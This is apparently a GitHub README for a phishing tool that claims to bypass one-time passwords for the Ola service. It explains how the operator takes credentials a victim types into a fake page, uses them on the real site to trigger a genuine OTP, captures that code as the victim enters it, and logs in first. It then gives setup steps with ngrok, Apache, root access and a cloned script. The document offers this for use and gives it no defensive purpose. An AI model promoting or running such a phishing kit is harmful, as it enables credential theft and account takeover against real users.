# OLA-OTP BYPASS TOOL
with the help of this tool you can easily bypass otp ! olacap

![ol](https://user-images.githubusercontent.com/55870659/76345166-3bdd3700-62d9-11ea-9d02-cfc2e8668810.png)


# OTP Bypass Instructions
When victim enter his credentials, you need to go to original website and use those credentials to send real OTP to victim. Once he enter that OTP such OTP will also be there with you and you will be allowed to login the account before him.

# Requirements
1. ngrok setup
2. Root - Must
3. Apache Server
4. Internet
5. add repo on kali

# How to Intsall & Use
root ---must !
1. git clone https://github.com/Ignitetch/ola-otpbypass.git 
2. cd ola-otpbypass/
3. chmod 777 *
4. ./ola.sh 

# Contact For Contribute
sg5479845@gmail.com
